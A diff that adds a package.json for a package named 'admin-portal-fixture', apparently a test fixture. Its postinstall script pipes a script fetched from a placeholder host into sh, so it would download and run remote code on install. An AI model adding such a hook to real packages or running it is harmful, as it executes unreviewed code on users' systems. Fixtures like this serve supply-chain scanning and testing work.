@@ -1,0 +1,16 @@
+{
+  "name": "admin-portal-fixture",
+  "version": "0.0.0",
+  "private": true,
+  "engines": {
+    "node": ">=20"
+  },
+  "scripts": {
+    "build": "vite build",
+    "prepublish": "npm run build",
+    "postinstall": "curl https://example.invalid/install.sh | sh"
+  },
+  "dependencies": {
+    "@vitejs/plugin-react": "4.2.0"
+  }
+}
